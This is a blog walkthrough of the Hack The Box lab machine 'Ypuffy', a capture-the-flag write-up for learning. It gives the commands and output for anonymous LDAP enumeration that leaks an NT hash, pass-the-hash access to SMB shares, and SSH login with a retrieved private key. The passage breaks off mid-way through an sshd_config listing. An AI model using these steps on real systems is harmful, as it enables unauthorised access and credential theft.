<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Ypuffy - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Ypuffy"><a href="#Hack-The-Box-Ypuffy" class="headerlink" title="Hack The Box - Ypuffy"></a>Hack The Box - Ypuffy</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today Ypuffy retired and this is my write-up. This box is a little different from the other boxes. It’s not windows or linux , it’s running openbsd which is a unix-like system. I really liked the privilege escalation in this box because it had some cool ssh stuff. Without talking too much let’s jump right in. It’s a medium difficulty box and its ip is 10.10.10.107 , i added it in <code>/etc/hosts</code> as <code>ypuffy.htb</code><br><img src="/images/hackthebox/ypuffy/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with nmap so :<br><code>nmap -sV -sT -sC ypuffy.htb</code><br><img src="/images/hackthebox/ypuffy/1.png" alt=""><br>Nmap tells us that there’s ssh running on port 22 , http on port 80 , smb on port 139 and 445 , ldap on port 389<br>It also tells us that we can connect anonymously to ldap.</p>
<h2 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h2><p>Let’s check http first<br><img src="/images/hackthebox/ypuffy/2.png" alt=""><br>Connection reset. http will be useful later but not now.<br>Moving on to the next thing , we have smb. Let’s see if we can do a null authentication and enumerate the shares. We will use <code>smbmap</code><br><code>smbmap -H ypuffy.htb</code><br><img src="/images/hackthebox/ypuffy/3.png" alt=""><br>Access Denied.<br>Let’s check ldap</p>
<h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>nmap told us that anonymous authentication was allowed so we will use a tool called <code>ldapsearch</code><br><code>ldapsearch -h 10.10.10.107 -p 389 -x -b dc=hackthebox,dc=htb</code><br>Full Output :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"># extended LDIF</span><br><span class="line">#</span><br><span class="line"># LDAPv3</span><br><span class="line"># base &lt;dc&#x3D;hackthebox,dc&#x3D;htb&gt; with scope subtree</span><br><span class="line"># filter: (objectclass&#x3D;*)</span><br><span class="line"># requesting: ALL</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"># hackthebox.htb</span><br><span class="line">dn: dc&#x3D;hackthebox,dc&#x3D;htb</span><br><span class="line">dc: hackthebox</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: domain</span><br><span class="line"></span><br><span class="line"># passwd, hackthebox.htb</span><br><span class="line">dn: ou&#x3D;passwd,dc&#x3D;hackthebox,dc&#x3D;htb</span><br><span class="line">ou: passwd</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: organizationalUnit</span><br><span class="line"></span><br><span class="line"># bob8791, passwd, hackthebox.htb</span><br><span class="line">dn: uid&#x3D;bob8791,ou&#x3D;passwd,dc&#x3D;hackthebox,dc&#x3D;htb</span><br><span class="line">uid: bob8791</span><br><span class="line">cn: Bob</span><br><span class="line">objectClass: account</span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: top</span><br><span class="line">userPassword:: e0JTREFVVEh9Ym9iODc5MQ&#x3D;&#x3D;</span><br><span class="line">uidNumber: 5001</span><br><span class="line">gidNumber: 5001</span><br><span class="line">gecos: Bob</span><br><span class="line">homeDirectory: &#x2F;home&#x2F;bob8791</span><br><span class="line">loginShell: &#x2F;bin&#x2F;ksh</span><br><span class="line"></span><br><span class="line"># alice1978, passwd, hackthebox.htb</span><br><span class="line">dn: uid&#x3D;alice1978,ou&#x3D;passwd,dc&#x3D;hackthebox,dc&#x3D;htb</span><br><span class="line">uid: alice1978</span><br><span class="line">cn: Alice</span><br><span class="line">objectClass: account</span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: sambaSamAccount</span><br><span class="line">userPassword:: e0JTREFVVEh9YWxpY2UxOTc4</span><br><span class="line">uidNumber: 5000</span><br><span class="line">gidNumber: 5000</span><br><span class="line">gecos: Alice</span><br><span class="line">homeDirectory: &#x2F;home&#x2F;alice1978</span><br><span class="line">loginShell: &#x2F;bin&#x2F;ksh</span><br><span class="line">sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001</span><br><span class="line">displayName: Alice</span><br><span class="line">sambaAcctFlags: [U          ]</span><br><span class="line">sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000</span><br><span class="line">sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B</span><br><span class="line">sambaPwdLastSet: 1532916644</span><br><span class="line"></span><br><span class="line"># group, hackthebox.htb</span><br><span class="line">dn: ou&#x3D;group,dc&#x3D;hackthebox,dc&#x3D;htb</span><br><span class="line">ou: group</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: organizationalUnit</span><br><span class="line"></span><br><span class="line"># bob8791, group, hackthebox.htb</span><br><span class="line">dn: cn&#x3D;bob8791,ou&#x3D;group,dc&#x3D;hackthebox,dc&#x3D;htb</span><br><span class="line">objectClass: posixGroup</span><br><span class="line">objectClass: top</span><br><span class="line">cn: bob8791</span><br><span class="line">userPassword:: e2NyeXB0fSo&#x3D;</span><br><span class="line">gidNumber: 5001</span><br><span class="line"></span><br><span class="line"># alice1978, group, hackthebox.htb</span><br><span class="line">dn: cn&#x3D;alice1978,ou&#x3D;group,dc&#x3D;hackthebox,dc&#x3D;htb</span><br><span class="line">objectClass: posixGroup</span><br><span class="line">objectClass: top</span><br><span class="line">cn: alice1978</span><br><span class="line">userPassword:: e2NyeXB0fSo&#x3D;</span><br><span class="line">gidNumber: 5000</span><br><span class="line"></span><br><span class="line"># ypuffy, hackthebox.htb</span><br><span class="line">dn: sambadomainname&#x3D;ypuffy,dc&#x3D;hackthebox,dc&#x3D;htb</span><br><span class="line">sambaDomainName: YPUFFY</span><br><span class="line">sambaSID: S-1-5-21-3933741069-3307154301-3557023464</span><br><span class="line">sambaAlgorithmicRidBase: 1000</span><br><span class="line">objectclass: sambaDomain</span><br><span class="line">sambaNextUserRid: 1000</span><br><span class="line">sambaMinPwdLength: 5</span><br><span class="line">sambaPwdHistoryLength: 0</span><br><span class="line">sambaLogonToChgPwd: 0</span><br><span class="line">sambaMaxPwdAge: -1</span><br><span class="line">sambaMinPwdAge: 0</span><br><span class="line">sambaLockoutDuration: 30</span><br><span class="line">sambaLockoutObservationWindow: 30</span><br><span class="line">sambaLockoutThreshold: 0</span><br><span class="line">sambaForceLogoff: -1</span><br><span class="line">sambaRefuseMachinePwdChange: 0</span><br><span class="line">sambaNextRid: 1001</span><br><span class="line"></span><br><span class="line"># search result</span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"># numResponses: 9</span><br><span class="line"># numEntries: 8</span><br></pre></td></tr></table></figure>
<p>we can also use nmap to enumerate ldap , with a script called <code>ldap-search</code><br><code>nmap -p 389 --script ldap-search ypuffy.htb</code><br>Full Output:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2019-02-08 14:30 EET</span><br><span class="line">Nmap scan report for ypuffy.htb (10.10.10.107)</span><br><span class="line">Host is up (0.14s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">389&#x2F;tcp open  ldap</span><br><span class="line">| ldap-search: </span><br><span class="line">|   Context: dc&#x3D;hackthebox,dc&#x3D;htb</span><br><span class="line">|     dn: dc&#x3D;hackthebox,dc&#x3D;htb</span><br><span class="line">|         dc: hackthebox</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: domain</span><br><span class="line">|     dn: ou&#x3D;passwd,dc&#x3D;hackthebox,dc&#x3D;htb</span><br><span class="line">|         ou: passwd</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: organizationalUnit</span><br><span class="line">|     dn: uid&#x3D;bob8791,ou&#x3D;passwd,dc&#x3D;hackthebox,dc&#x3D;htb</span><br><span class="line">|         uid: bob8791</span><br><span class="line">|         cn: Bob</span><br><span class="line">|         objectClass: account</span><br><span class="line">|         objectClass: posixAccount</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         userPassword: &#123;BSDAUTH&#125;bob8791</span><br><span class="line">|         uidNumber: 5001</span><br><span class="line">|         gidNumber: 5001</span><br><span class="line">|         gecos: Bob</span><br><span class="line">|         homeDirectory: &#x2F;home&#x2F;bob8791</span><br><span class="line">|         loginShell: &#x2F;bin&#x2F;ksh</span><br><span class="line">|     dn: uid&#x3D;alice1978,ou&#x3D;passwd,dc&#x3D;hackthebox,dc&#x3D;htb</span><br><span class="line">|         uid: alice1978</span><br><span class="line">|         cn: Alice</span><br><span class="line">|         objectClass: account</span><br><span class="line">|         objectClass: posixAccount</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: sambaSamAccount</span><br><span class="line">|         userPassword: &#123;BSDAUTH&#125;alice1978</span><br><span class="line">|         uidNumber: 5000</span><br><span class="line">|         gidNumber: 5000</span><br><span class="line">|         gecos: Alice</span><br><span class="line">|         homeDirectory: &#x2F;home&#x2F;alice1978</span><br><span class="line">|         loginShell: &#x2F;bin&#x2F;ksh</span><br><span class="line">|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001</span><br><span class="line">|         displayName: Alice</span><br><span class="line">|         sambaAcctFlags: [U          ]</span><br><span class="line">|         sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000</span><br><span class="line">|         sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B</span><br><span class="line">|         sambaPwdLastSet: 1532916644</span><br><span class="line">|     dn: ou&#x3D;group,dc&#x3D;hackthebox,dc&#x3D;htb</span><br><span class="line">|         ou: group</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: organizationalUnit</span><br><span class="line">|     dn: cn&#x3D;bob8791,ou&#x3D;group,dc&#x3D;hackthebox,dc&#x3D;htb</span><br><span class="line">|         objectClass: posixGroup</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         cn: bob8791</span><br><span class="line">|         userPassword: &#123;crypt&#125;*</span><br><span class="line">|         gidNumber: 5001</span><br><span class="line">|     dn: cn&#x3D;alice1978,ou&#x3D;group,dc&#x3D;hackthebox,dc&#x3D;htb</span><br><span class="line">|         objectClass: posixGroup</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         cn: alice1978</span><br><span class="line">|         userPassword: &#123;crypt&#125;*</span><br><span class="line">|         gidNumber: 5000</span><br><span class="line">|     dn: sambadomainname&#x3D;ypuffy,dc&#x3D;hackthebox,dc&#x3D;htb</span><br><span class="line">|         sambaDomainName: YPUFFY</span><br><span class="line">|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464</span><br><span class="line">|         sambaAlgorithmicRidBase: 1000</span><br><span class="line">|         objectclass: sambaDomain</span><br><span class="line">|         sambaNextUserRid: 1000</span><br><span class="line">|         sambaMinPwdLength: 5</span><br><span class="line">|         sambaPwdHistoryLength: 0</span><br><span class="line">|         sambaLogonToChgPwd: 0</span><br><span class="line">|         sambaMaxPwdAge: -1</span><br><span class="line">|         sambaMinPwdAge: 0</span><br><span class="line">|         sambaLockoutDuration: 30</span><br><span class="line">|         sambaLockoutObservationWindow: 30</span><br><span class="line">|         sambaLockoutThreshold: 0</span><br><span class="line">|         sambaForceLogoff: -1</span><br><span class="line">|         sambaRefuseMachinePwdChange: 0</span><br><span class="line">|_        sambaNextRid: 1001</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds</span><br></pre></td></tr></table></figure>
<p>The most interesting part is this :<br><img src="/images/hackthebox/ypuffy/4.png" alt=""><br>We get a username <code>alice1978</code> and an smb NT hash <code>0B186E661BBDBDCF6047784DE8B9FD8B</code><br>This hash is uncrackable however we can still use it to authenticate.</p>
<h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><p>We need to list the shares first to know where we can connect. We can use a tool called <code>crackmapexec</code> :<br><code>crackmapexec ypuffy.htb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B --shares</code><br><img src="/images/hackthebox/ypuffy/5.png" alt=""><br>There are only two shares <code>alice</code> and <code>IPC$</code> , we have read and write permissions to <code>alice</code> and no access to <code>IPC$</code><br>We can also use smbclient to list the shares :<br><code>smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -L //ypuffy.htb/</code><br><img src="/images/hackthebox/ypuffy/6.png" alt=""><br>But it doesn’t tell us which shares do we have access to and which we don’t.<br>So we know that we can access the share <code>alice</code> , let’s connect.<br><code>smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash //ypuffy.htb/alice</code><br><img src="/images/hackthebox/ypuffy/7.png" alt=""><br>There’s only one file called <code>my_private_key.ppk</code> , <code>get my_private_key.ppk</code> to download it.</p>
<h2 id="SSH-and-getting-user"><a href="#SSH-and-getting-user" class="headerlink" title="SSH and getting user"></a>SSH and getting user</h2><p><code>my_private_key.ppk</code> is a putty private key , we need to convert that to an ssh private key to be able to ssh with it.<br>On kali I had to get <code>putty-tools</code> first<br><code>apt-get install putty-tools</code><br>Then we will use <code>puttygen</code> :<br><code>puttygen my_private_key.ppk -O private-openssh -o alice.key</code><br>Now let’s take a look at the key :<br><img src="/images/hackthebox/ypuffy/8.png" alt=""><br>Last step is to <code>chmod 600 alice.key</code> and finally ssh<br><code>ssh -i alice.key alice1978@ypuffy.htb</code><br><img src="/images/hackthebox/ypuffy/9.png" alt=""><br>And we owned user !</p>
<h2 id="More-Enumeration"><a href="#More-Enumeration" class="headerlink" title="More Enumeration"></a>More Enumeration</h2><p>Remember http ? we got a connection reset. Let’s check <code>/etc/httpd.conf</code><br><img src="/images/hackthebox/ypuffy/10.png" alt=""><br>We see two interesting things , <code>location &quot;/userca*&quot;</code> and <code>location &quot;/sshauth*&quot;</code><br>After some more enumeration , there are 3 users on the box<br><img src="/images/hackthebox/ypuffy/11.png" alt=""><br><code>alice1978</code> , <code>bob8791</code> and <code>userca</code><br>bob8791 has a directory called <code>dba</code><br><img src="/images/hackthebox/ypuffy/12.png" alt=""><br>Inside it there’s an sql file called <code>sshauth.sql</code><br><img src="/images/hackthebox/ypuffy/13.png" alt=""></p>
<p><img src="/images/hackthebox/ypuffy/14.png" alt=""><br>It creates a table called <code>principals</code> and another table called <code>keys</code><br>If we also check <code>sshd_config</code> in <code>/etc/ssh/</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">#	$OpenBSD: sshd_config,v 1.102 2018&#x2F;02&#x2F;16 02:32:40 djm Exp $</span><br><span class="line"></span><br><span class="line"># This is the sshd server system-wide configuration file.  See</span><br><span class="line"># sshd_config(5) for more information.</span><br><span class="line"></span><br><span class="line"># The strategy used for options in the default sshd_config shipped with</span><br><span class="line"># OpenSSH is to specify options with their default value where</span><br><span class="line"># possible, but leave them commented.  Uncommented options override the</span><br><span class="line"># default value.</span><br><span class="line"></span><br><span class="line">#Port 22</span><br><span class="line">#AddressFamily any</span><br><span class="line">#ListenAddress 0.0.0.0</span><br><span class="line">#ListenAddress ::</span><br><span class="line"></span><br><span class="line">#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key</span><br><span class="line">#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_ecdsa_key</span><br><span class="line">#HostKey &#x2F;etc&#x2F;ssh&#x2F;ssh_host_ed25519_key</span><br><span class="line"></span><br><span class="line"># Ciphers and keying</span><br><span class="line">#RekeyLimit default none</span><br><span class="line"></span><br><span class="line"># Logging</span><br><span class="line">#SyslogFacility AUTH</span><br><span class="line">#LogLevel INFO</span><br><span class="line"></span><br><span class="line"># Authentication:</span><br><span class="line"></span><br><span class="line">#LoginGraceTime 2m</span><br><span class="line">PermitRootLogin prohibit-password</span><br><span class="line">#StrictModes yes</span><br><span class="line">#MaxAuthTries 